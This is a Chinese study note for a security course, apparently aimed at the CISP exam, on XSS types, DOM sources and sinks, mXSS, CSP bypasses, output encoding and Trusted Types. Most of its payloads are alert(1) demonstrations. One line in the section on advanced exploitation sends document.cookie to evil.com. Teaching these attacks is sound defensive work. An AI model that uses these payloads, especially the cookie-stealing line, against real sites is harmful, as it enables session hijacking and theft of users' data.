# Day 52：XSS深入

> **所属周**：Week 8 — 应用安全 · **主题**：跨站脚本攻击进阶与防御策略

---

## 📑 目录

1. [XSS分类再梳理](#一xss分类再梳理)
2. [DOM XSS深度分析](#二dom-xss深度分析)
3. [mXSS（突变XSS）](#三mxss突变xss)
4. [CSP绕过技术](#四csp绕过技术)
5. [XSS防御体系](#五xss防御体系)
6. [XSS在框架中的防御](#六xss在框架中的防御)
7. [高级利用场景](#七高级利用场景)
8. [CISP考试速查](#cisp考试速查)
9. [自检清单](#自检清单)

---

## 一、XSS分类再梳理

```
XSS三大类型：

① 反射型 (Reflected XSS)：
   恶意脚本在URL参数中 → 服务器回显 → 浏览器执行
   触发方式：诱导用户点击恶意链接
   示例：/search?q=<script>alert(1)</script>
   
② 存储型 (Stored/Persistent XSS)：
   恶意脚本存储在服务器端 → 其他用户访问页面时执行
   触发方式：受害者访问正常页面
   示例：评论中插入<script>，存入数据库，所有人看到都触发
   
③ DOM型 (DOM-based XSS)：
   恶意脚本在客户端执行 → 不经过服务器
   触发方式：URL Hash/参数被JS不安全处理
   示例：document.write(location.hash)
```

### 1.1 危害等级

| XSS类型 | 危害 | 传播 | 检测难度 |
|---------|------|------|---------|
| 存储型 | ⚠️ 最高 | 自动传播 | 一般 |
| 反射型 | ⚠️ 中 | 需要点击 | 容易 |
| DOM型 | ⚠️ 中高 | 需要点击 | 困难（WAF看不见） |
| mXSS | ⚠️ 高 | 取决于类型 | 困难 |

---

## 二、DOM XSS深度分析

### 2.1 Sink和Source

```
DOM XSS = Source → 危险的数据流 → Sink

Source (输入源)：
  · location / location.href / location.search / location.hash
  · document.URL / document.documentURI
  · document.referrer
  · window.name
  · postMessage data
  · Cookie

Sink (危险输出点)：
  · innerHTML / outerHTML
  · document.write() / document.writeln()
  · eval() / setTimeout() / setInterval()
  · location.href / location.replace()
  · document.createElement() + appendChild()
  · jQuery html() / append() 等

示例：
  // Source: location.hash  
  // Sink: innerHTML
  document.getElementById("content").innerHTML = 
      decodeURIComponent(location.hash.slice(1));
  
  攻击URL: https://example.com/page#<img src=x onerror=alert(1)>
```

### 2.2 常见DOM XSS模式

```
模式1：innerHTML注入
  element.innerHTML = userInput;  → 危险！
  修复：element.textContent = userInput;

模式2：eval注入
  eval('var x = ' + location.hash.slice(1));
  修复：JSON.parse(userInput);

模式3：重定向注入
  location.href = getParameter('redirect');
  → javascript:alert(1)
  修复：验证URL协议为http/https

模式4：jQuery危险用法
  $(userInput)  → 如果input是"<img src=x onerror=...>"
  修复：$(document.createTextNode(userInput))

模式5：postMessage不安全处理
  window.addEventListener('message', function(e) {
    document.getElementById('data').innerHTML = e.data;
  });
  → 任何站点都可以发消息
  修复：验证e.origin
```

---

## 三、mXSS（突变XSS）

### 3.1 mXSS原理

```
mXSS (Mutation XSS)：

浏览器解析HTML → 构建DOM → 序列化回HTML → 与原始不同！

示例：
  <listing><img src=1 onerror=alert(1)></listing>
  
  innerHTML读取 → 浏览器修正为：
  <listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
  
  innerHTML赋值回去 → 浏览器解析修正版本：
  → <img src=1 onerror=alert(1)> 被激活！

为什么？
  listing元素内的内容被解析为纯文本
  但innerHTML序列化时listing没有被正确处理
  重新注入时listing标签消失 → 内容变为HTML
```

### 3.2 mXSS常用触发元素

```
与mXSS相关的HTML元素：

  · <listing> — 内容被解析为文本
  · <xmp> — 同上
  · <noscript> — 启用JS后内容处理方式变化
  · <title> — 内容被解析为纯文本
  · <textarea> — 内容被解析为纯文本
  · <iframe srcdoc> — 嵌套解析上下文
  · <math><mtext> — SVG/MathML中的文本元素
  · <svg><style> — SVG/Style元素的特殊解析
```

---

## 四、CSP绕过技术

### 4.1 常见绕过方法

```
CSP策略：script-src 'self'

① JSONP接口滥用：
   <script src="/api/jsonp?callback=alert(1)">
   服务器返回：alert(1)({...})
   → 执行alert(1)！

② 角度库绕过（AngularJS）：
   <div ng-app ng-csp>
     <div ng-click=$event.view.alert(1)>Click</div>
   
③ 文件上传绕过：
   上传包含JS的图片/SVG → script-src 'self'信任它

④ 路径特性：
   /jsonp.php?callback=evil → 在同源下

⑤ 使用nonce绕过：
   找到页面中已有的<script nonce=...>元素的影响
```

### 4.2 为什么CSP不是万能

```
CSP的局限性：

1. 配置错误：
   'unsafe-inline' → 绕过了CSP核心价值
   'unsafe-eval' → eval仍可执行

2. 框架/组件：
   使用了内联事件处理器的UI库
   → 必须加'unsafe-hashes'或改用nonce

3. 遗留代码：
   大量内联脚本的历史项目 → 迁移困难

4. CSP报告分析不足：
   report-uri配置了但不分析
   → 不知道有CSP绕过尝试

✅ 推荐：CSP + Trusted Types + 输出编码 = 三层防护
```

---

## 五、XSS防御体系

### 5.1 输出编码规则

```
最关键原则：在输出时根据上下文选择正确的编码方式

┌───────────────────┬────────────────────────────────┐
│   上下文           │          编码方式               │
├───────────────────┼────────────────────────────────┤
│ HTML文本           │ & → &amp;  < → &lt; > → &gt; │
│ HTML属性           │ " → &quot; ' → &#x27;         │
│ JavaScript字符串   │ \ → \\  " → \"  ' → \'        │
│ URL参数            │ %编码(encodeURIComponent)    │
│ CSS               │ \编码(\\<hex>)               │
│ HTML data-*        │ HTML实体编码                  │
└───────────────────┴────────────────────────────────┘

错误示例：
  var userName = '<?php echo $_GET['name']; ?>';
  → 如果name=Alice'; alert(1);//
  → var userName = 'Alice'; alert(1);//';  ← XSS!

正确做法：
  var userName = '<?php echo json_encode($_GET['name']); ?>';
```

### 5.2 Trusted Types

```
Trusted Types（可信类型）— 浏览器新安全特性：

启用：
  Content-Security-Policy: require-trusted-types-for 'script'

效果：
  · 禁止向innerHTML等Sink传入原始字符串
  · 必须传入TrustedHTML/TrustedScript对象
  · 从根本上杜绝DOM XSS

策略示例：
  trustedTypes.createPolicy('default', {
    createHTML: (input) => {
      return DOMPurify.sanitize(input);  // 净化HTML
    },
    createScript: (input) => {
      throw new Error('不允许动态脚本');
    }
  });
```

---

## 六、XSS在框架中的防御

| 框架 | 默认防御 | 逃逸方法（需注意） |
|------|---------|-------------------|
| React | JSX自动转义 | dangerouslySetInnerHTML, href |
| Vue | {{}}自动转义 | v-html, v-bind:href |
| Angular | 默认所有值转义 | [innerHTML], bypassSecurityTrustHtml |
| Svelte | {}自动转义 | {@html ...} |

---

## 七、高级利用场景

```
XSS高级利用链：

① Cookie窃取 (经典)：
   <script>new Image().src='http://evil.com/steal?c='+document.cookie</script>

② 钓鱼页面注入：
   注入伪造登录表单 → 窃取凭据

③ 键盘记录：
   监听用户键盘输入

④ 内网端口扫描：
   通过WebSocket/fetch探测内网服务

⑤ BeEF框架利用：
   浏览器渗透框架 → 持久化控制受害者浏览器

⑥ Service Worker持久化：
   注册恶意Service Worker → 永久后门

⑦ CSP绕过 + 数据外传：
   结合DNS外传/CSP报告外传绕过限制
```

---

## 八、CISP考试速查

| 考点 | 记忆要点 |
|------|---------|
| XSS三类型 | "反射(URL)、存储(DB)、DOM(客户端)" |
| DOM XSS关键 | "Source→Sink，数据不经过服务器" |
| 输出编码 | "HTML实体编码是反射/存储XSS的根本防御" |
| CSP绕过 | "JSONP、Angular、文件上传、nonce滥用" |
| Trusted Types | "浏览器原生防DOM XSS API" |

---

## 九、自检清单

- [ ] 三种XSS的触发方式和检测难度？
- [ ] DOM XSS的Source和Sink分别有哪些？
- [ ] mXSS攻击的原理是什么？
- [ ] CSP的局限性有哪些？如何绕过？
- [ ] 不同上下文的输出编码规则？
- [ ] Trusted Types如何防御DOM XSS？
- [ ] React/Vue/Angular各自如何防御XSS？逃逸方法有哪些？

---

> **下一步**：Day 53 学习CSRF攻击——Token机制、SameSite Cookie与高级防御。
